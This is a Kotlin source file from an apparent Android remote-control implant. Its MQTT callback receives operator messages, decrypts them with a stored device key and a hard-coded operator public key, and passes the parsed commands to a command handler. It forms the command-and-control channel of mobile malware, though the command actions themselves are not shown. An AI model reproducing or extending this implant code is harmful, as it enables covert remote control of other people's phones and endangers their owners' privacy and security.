package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.crypto.Base64Encoder
import com.cooperthecoder.implant.crypto.Base64KeyPair
import com.cooperthecoder.implant.crypto.NetworkEncryption
import com.cooperthecoder.implant.data.SharedPreferencesQuery
import org.eclipse.paho.android.service.MqttAndroidClient
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken
import org.eclipse.paho.client.mqttv3.MqttCallbackExtended
import org.eclipse.paho.client.mqttv3.MqttMessage
import java.nio.charset.Charset

class CommandMessageCallback(client: MqttAndroidClient, context: Context) : MqttCallbackExtended {

    companion object {
        val TAG: String = CommandMessageCallback::class.java.name
    }

    val context: Context = context.applicationContext
    val commandHandler = CommandHandler(context, client)

    override fun messageArrived(topic: String, message: MqttMessage) {
        val text = String(message.payload, Charset.forName("UTF-8"))
        Log.d(TAG, "Received message: $text")
        val privateKey = Base64KeyPair(SharedPreferencesQuery.getPrivateKey(context)).privateKeyBase64()
        val networkEncryption = NetworkEncryption(
                Config.OPERATOR_PUBLIC_KEY,
                privateKey
        )
        val command: Command = try {
            Command.fromJson(networkEncryption, text)
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing JSON from: $text", e)
            return
        }
        commandHandler.handle(command)
    }

    override fun connectionLost(cause: Throwable?) {
        Log.d(TAG, "Lost connection to MQTT server")
        cause?.printStackTrace()
    }

    override fun deliveryComplete(token: IMqttDeliveryToken) {
        Log.d(TAG, "Delivery completed")
    }

    override fun connectComplete(reconnect: Boolean, serverURI: String) {
        Log.d(TAG, "Connected to $serverURI")
    }

}